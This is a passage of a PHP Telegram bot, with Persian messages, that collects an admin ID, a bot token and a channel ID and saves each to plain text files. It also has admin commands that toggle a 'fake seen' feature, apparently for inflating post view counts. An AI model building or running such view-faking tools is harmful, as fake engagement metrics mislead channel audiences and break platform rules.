'chat_id'=>$from_id,
'text'=>"اطلاعات ویوپنل خود را کامل کنید",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"ایدی عددی ادمین"],['text'=>"توکن ربات ویوپنل"],['text'=>"ایدی چنل"]],
  	  [['text'=>'🔙برگشت🔙']],
   ]
  ])
]);
}
//
elseif($text == "ایدی عددی ادمین"){
save("data/$from_id/com.txt","idadmin");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"ایدی عددی مدیر را وارد نمایید🌱
در صورت اشتباه وارد کردن ادمین ربات هیچ مسئولیتی در قبال کسر سکه ندارد👨🏻‍💻",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
}
elseif($command == 'idadmin'){
save("data/$chat_id/idadmin.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
//
elseif($text == "توکن ربات ویوپنل"){
save("data/$from_id/com.txt","tokenbot");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"توکن رباتی را که میخواهید ویوپنل شود را ارسال کنید[🔋]
در صورت اشتباه وارد کردن ادمین ربات هیچ مسئولیتی در قبال کسر سکه ندارد👨🏻‍💻",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
}
elseif($command == 'tokenbot'){
save("data/$chat_id/tokenbot.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
//
elseif($text == "ایدی چنل"){
save("data/$from_id/com.txt","idchannel");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"ایدی چنل🔒ی ه میخواهید ربات قفل شود را همراه با @ ارسال کنید[🎃]
در صورت اشتباه وارد کردن ادمین ربات هیچ مسئولیتی در قبال کسر سکه ندارد👨🏻‍💻",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
}
elseif($command == 'idchannel'){
save("data/$chat_id/idchannel.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'[⚙️]برگشت به تنظیمات[⚙️]']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
//..................................................................................//
elseif($text == "خاموش کردن سین فیک" && in_array($chat_id,$ADMIN)){
if($feek != "off"){
file_put_contents("feek.txt","off");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"🎭 ربات خاموش شد",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ربات از قبل خاموش بود...",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}
}

elseif($text == "روشن کردن سین فیک" && in_array($chat_id,$ADMIN)){
if($feek != "on"){
file_put_contents("feek.txt","on");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"🙃 ربات روشن شد",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ربات از قبل روشن بود...",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}}
	


set_time_limit(-100000000);
flush();
?>
